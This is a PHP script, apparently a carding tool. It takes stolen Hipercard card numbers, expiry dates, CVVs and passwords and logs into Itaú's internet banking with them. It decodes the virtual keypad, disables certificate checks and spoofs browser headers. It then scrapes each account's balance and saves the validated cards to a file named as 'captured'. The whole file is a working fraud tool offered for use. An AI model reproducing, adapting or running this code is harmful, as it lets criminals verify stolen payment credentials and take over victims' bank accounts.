<?php
error_reporting(0);
list($card_number, $card_val, $card_cvv, $card_passw) = explode('|', $_REQUEST['lista']);

function getStr($string, $start, $end, $i) {
   $str = explode($start, $string);
   $str = explode($end, $str[$i]);
   return $str[0];
}

if (empty($card_number)) {
   exit();
}

if (empty($card_val)) {
   exit();
}

if (empty($card_cvv)) {
   exit();
}
if (empty($card_passw)) {
   exit();
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://99.83.197.51/router-app/router');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "usuario.cartao=$card_number&portal=004&pre-login=pre-login&tipoLogon=9");
curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
$headers = array();
$headers[] = 'Host: internetnc4.itau.com.br';
$headers[] = 'Upgrade-Insecure-Requests: 1';
//$headers[] = 'X-Forwarded-For: '.$ip;
$headers[] = 'Origin: null';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'Referer: https://www.itau.com.br/';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/ck.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/ck.txt');
$result = curl_exec($ch);

   $sen = [];

   foreach (str_split($card_passw) as $num) {
      for ($i=1; $i <= 5; $i++) { 
         $numeros = explode(' ou ', getStr($result, 'aria-label="', '"', $i));
         foreach ($numeros as $number) {
            if ($number == $num) {
               $sen[] = getStr($result,'rel="tecla_','"',$i);
            }
         }
      }
   }

   $op = getStr($result, 'name="op" value="','">',1);




   $autht = getStr($result, "authToken='", "';", 1);
   $flowId = getStr($result, "flowId='", "';", 1);

   curl_setopt($ch, CURLOPT_URL, 'https://internetnc4.itau.com.br/router-app/router');
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($ch, CURLOPT_POSTFIELDS, "op=".urlencode($op)."&senha=".implode('', $sen));
   curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
   curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
   curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/ck.txt');
   curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
   curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/ck.txt');
   $headers = array();
   $headers[] = 'Connection: keep-alive';
   $headers[] = 'Pragma: no-cache';
   $headers[] = 'Cache-Control: no-cache';
   $headers[] = 'Segmento: hipercard';
   $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36';
   $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
   $headers[] = 'Accept: */*';
   $headers[] = 'Rendertype: parcialPage';
   $headers[] = 'X-Auth-Token: '.$autht;
   $headers[] = 'X-Flow-Id: '.$flowId;
   $headers[] = 'X-Requested-With: XMLHttpRequest';
   $headers[] = 'Op: '.$op;
   $headers[] = 'Origin: https://internetnc2.itau.com.br';
   $headers[] = 'Sec-Fetch-Site: same-origin';
   $headers[] = 'Sec-Fetch-Mode: cors';
   $headers[] = 'Sec-Fetch-Dest: empty';
   $headers[] = 'Referer: https://internetnc2.itau.com.br/router-app/router';
   $headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
   curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

   $result = curl_exec($ch);
   $flow = trim(getStr($result, 'X-FLOW-ID: ', "\n", 1));
   $op = getStr($result, 'loadHomePage("','"',1);
   curl_setopt($ch, CURLOPT_URL, 'https://internetnc4.itau.com.br/router-app/router');
   curl_setopt($ch, CURLOPT_POSTFIELDS, '');
   curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/ck.txt');
   curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/ck.txt');
   curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
   $headers = array();
   $headers[] = 'Connection: keep-alive';
   $headers[] = 'Content-Length: 0';
   $headers[] = 'Pragma: no-cache';
   $headers[] = 'Cache-Control: no-cache';
   $headers[] = 'Segmento: hipercard';
   $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36';
   $headers[] = 'Ajaxrequest: true';
   $headers[] = 'Accept: */*';
   $headers[] = 'X-Auth-Token: '.$autht;
   $headers[] = 'X-Flow-Id: '.$flow;
   $headers[] = 'X-Requested-With: XMLHttpRequest';
   $headers[] = 'Scrolltotop: true';
   $headers[] = 'Op: '.$op;
   $headers[] = 'Origin: https://internetnc4.itau.com.br';
   $headers[] = 'Sec-Fetch-Site: same-origin';
   $headers[] = 'Sec-Fetch-Mode: cors';
   $headers[] = 'Sec-Fetch-Dest: empty';
   $headers[] = 'Referer: https://internetnc4.itau.com.br/router-app/router';
   $headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
   curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
   $result = curl_exec($ch);

   $saldo = getStr($result, 'disponível: <strong> ', ' </strong>', 1);
   $tipo = getStr($result, '<p class="margem-baixo10"> ', '<br>', 1);
   if (empty($saldo)) {
      $senha = "INCORRETA/BLOQUEADA ($card_passw)";
   }else{
      $senha = $card_passw." - SALDO: $saldo - $tipo";
   }

   $linha = "$card_number|$card_val|$card_cvv - SENHA: $senha";
   echo $linha;
   file_put_contents('hipercard.capturadas.private', base64_encode($linha)."\n", FILE_APPEND);